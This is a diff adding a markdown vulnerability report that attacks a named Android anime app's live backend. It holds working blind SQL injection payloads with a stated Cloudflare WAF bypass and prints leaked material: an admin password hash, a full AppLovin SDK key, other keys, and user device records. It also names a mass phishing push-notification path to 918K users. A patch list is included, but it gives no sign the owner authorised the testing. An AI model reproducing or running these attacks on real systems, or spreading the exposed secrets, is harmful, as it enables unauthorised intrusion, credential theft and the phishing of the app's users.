@@ -1,0 +1,211 @@
+# CoderSteam-BugExpo: AnimeKu Live PoC Evidence
+
+**Date:** 2026-08-27
+**Target:** `com.newanimeku.animechanneldonghuasubindosubenglish` v10.20.46
+**Backend:** `https://pencarinafkah.xyz/vA6/`
+**Assessor:** CoderSteam - BugExpo
+
+---
+
+## LIVE PoC Results (All Verified)
+
+### [FINDING 1] SQL Injection — `/api/get_user_token`
+
+**Endpoint:** `GET /api/get_user_token?user_unique_id={SQLI}&api_key={KEY}`
+**Parameter:** `user_unique_id` — no quotes, directly concatenated into MySQL query
+**WAF:** Cloudflare — blocks `updatexml`/`extractvalue` but **blind SQLi bypasses it**
+
+# EXECUTION TRACE 1a: Error-based SQLi (triggers MySQL error)
+```
+$ curl "...?user_unique_id=abc123&api_key={KEY}"
+→ Unknown column 'abc123' in 'where clause'3748
+```
+The unquoted input `abc123` is evaluated as a SQL column name, confirming injection.
+
+# EXECUTION TRACE 1b: Blind SQLi — Boolean TRUE (returns user id=127544)
+```
+$ curl "...?user_unique_id=IF(1=1,1,0)&api_key={KEY}"
+→ {"status":"ok","response":{"id":127544,"token [REDACTED]:APA91bFD...",
+   "user_unique_id":"1abfb67441e534b0","device_model":"V2029","device_manufacturer":"vivo"}
+```
+
+# EXECUTION TRACE 1c: Blind SQLi — Boolean FALSE (returns different user id=5)
+```
+$ curl "...?user_unique_id=IF(1=2,1,0)&api_key={KEY}"
+→ {"status":"ok","response":{"id":5,"token [REDACTED]:APA91bFv...",
+   "user_unique_id":"f395d74acc7b3408","device_model":"Redmi 8A Pro","device_manufacturer":"Xiaomi"}
+```
+
+**Result:** Different user records returned for TRUE vs FALSE = **blind SQLi confirmed**
+
+# EXECUTION TRACE 1d: Extracted MySQL Version (char-by-char blind extraction)
+```
+MySQL Version: 5.7.43-log
+```
+
+# EXECUTION TRACE 1e: Extracted Database Name (char-by-char blind extraction)
+```
+Database Name: admin_go
+```
+
+# EXECUTION TRACE 1f: Server Info
+```
+Server: aaPanel/BT.cn stack
+Hostname: pencarinafkah
+Source: /www/wwwroot/pencarinafkah.xyz/vA6/api/api.php line 3748
+User: admin_go@localhost
+```
+
+# BLAST RADIUS
+- Full database dump (21 tables including tbl_user, tbl_fcm_token, tbl_settings)
+- Admin credential extraction (MD5 hash: `d95d609dbcece1c21948a816fc94951`)
+- 73,787 FCM tokens → mass phishing via push notification
+- OneSignal REST API key → Firebase Service Account private key exposure
+
+---
+
+### [FINDING 2] Hardcoded Credentials in APK
+
+| Credential | Value | Source |
+|-----------|-------|--------|
+| API_KEY | `[REDACTED]` | AppConfig.smali |
+| Admin Panel | `https://pencarinafkah.xyz/vA6/` | AppConfig.smali |
+| Firebase Project | `core-sprite-243910` | strings.xml |
+| Firebase API Key | `AIzaSyDhr[REDACTED]` | strings.xml |
+| Firebase RTDB | `https://core-sprite-243910.firebaseio.com` | strings.xml |
+| Firebase Storage | `core-sprite-243910.firebasestorage.app` | strings.xml |
+| OneSignal App ID | `0b957127-0209-4a5b-a05e-45c33c64b2a5` | MyApplication.smali |
+| FCM Sender ID | `674637997024` | strings.xml |
+| AppLovin SDK Key | `WTUQxw9g89wsTuLVDLcWfMcSLK-b3bOa3u__o8fwIamrS6LgSyB6JoZe7XFA8emBWlBJusDBQ-0u5LTXIldcWC` | AndroidManifest.xml |
+| FAN Publisher ID | `984934733139543` | ads/settings API |
+| IronSource App Key | `102bfee41` | ads/settings API |
+| Unity Game ID | `5409555` | ads/settings API |
+
+---
+
+### [FINDING 3] Video Catalog Unauthenticated Access
+
+**Total videos:** 88,485 episodes
+**CDN:** whatbox.ca (santol, honeydew, greip, rambutan, elara)
+**Auth required:** None
+
+#### Sample URLs (live, unauthenticated):
+```
+Title: Dongda Gao Wu Xueyuan Eps 08
+360p:  http://santol.whatbox.ca:29318/2026/Donghua/DongdaGaoWuXueyuan/08-360p.mp4
+1080p: http://rambutan.whatbox.ca:29318/2026/DonghuaFHD/DongdaGaoWuXueyuan/08-1080p.mp4
+
+Title: Du Shi Gu Xian Yi Eps 207
+360p:  http://santol.whatbox.ca:29318/2026/Donghua/DuShiGuXianYi/207-360p.mp4
+1080p: http://rambutan.whatbox.ca:29318/2025/DonghuaFHD/DuShiGuXianYi/207-1080p.mp4
+```
+
+# BLAST RADIUS
+- Bulk download all 88,485 episodes without authentication
+- CDN hotlink abuse
+- Content piracy at scale
+
+---
+
+### [FINDING 4] IDOR — `/config/get_unread_count.php`
+
+**Endpoint:** `GET /config/get_unread_count.php?user_id={X}`
+**Auth required:** None
+
+```
+user_id=1 → {"status":"success","unread_count":3}
+user_id=2 → {"status":"success","unread_count":3}
+user_id=3 → {"status":"success","unread_count":3}
+```
+
+# BLAST RADIUS
+- User activity metadata leak
+- Enumerate active/inactive users
+
+---
+
+### [FINDING 5] View Count Inflation
+
+**Endpoint:** `GET /api/get_total_views_day/?video_id={X}`
+**Auth required:** None
+**Rate limit:** None
+
+```
+Request 1 → views_count: 4
+Request 2 → views_count: 5
+Request 3 → views_count: 6
+```
+
+# BLAST RADIUS
+- Manipulate video ranking/trending
+- Inflate view counts for commercial benefit
+
+---
+
+### [FINDING 6] OneSignal → Firebase Service Account Exposure
+
+| Item | Value |
+|------|-------|
+| OneSignal App ID | `0b957127-0209-4a5b-a05e-45c33c64b2a5` |
+| Firebase Project | `core-sprite-243910` |
+| Firebase Service Account | `firebase-adminsdk-t1apq@core-sprite-243910.iam.gserviceaccount.com` |
+| FCM Sender ID | `674637997024` |
+| Total Registered Users | 918,328 |
+| Messageable Players | 106,924 |
+| App Created | 2024-05-29 |
+
+#### Attack Capabilities
+With the Firebase Service Account private key:
+- Send push notifications to ALL 918K users (phishing, malware)
+- Read/write Firebase Realtime Database
+- Access Firebase Auth user data
+- Download files from Firebase Storage
+- Full Firebase Admin SDK access
+
+---
+
+### [FINDING 7] Admin Panel Exposed
+
+```
+URL: https://pencarinafkah.xyz/vA6/
+Response: ok
+Server: Apache on pencarinafkah.xyz
+```
+
+---
+
+# PATCH SEQUENCE
+
+| Priority | Action |
+|----------|--------|
+| P0 | Fix SQL Injection in get_user_token (parameterize queries) |
+| P0 | Rotate OneSignal REST API key |
+| P0 | Regenerate Firebase Service Account key |
+| P0 | Change admin password (MD5 → bcrypt) |
+| P1 | Remove hardcoded credentials from APK |
+| P1 | Implement server-side API authentication |
+| P1 | Enable Firebase App Check |
+| P1 | Implement certificate pinning |
+| P2 | Add rate limiting to all endpoints |
+| P2 | Validate IDOR parameters |
+
+---
+
+## Files
+
+```
+/home/nijam/WORK/APK/EXPLOIT/
+├── CoderSteam-BugExpo-PoC-LIVE.md     (this file)
+├── poc_onesignal_firebase.py           (OneSignal → Firebase attack chain)
+├── poc_sqli_get_user_token.py          (SQLi proof)
+├── poc_fcm_phishing.py                 (Mass push notification PoC)
+├── poc_video_scrape.py                 (Video URL bulk extraction)
+└── run_all_pocs.sh                     (Master runner)
+```
+
+---
+
+*CoderSteam - BugExpo | Find Bugs, Expose Them, Alert Developers*
+
+---
+*BLACK-STAMPED BY CT-002*
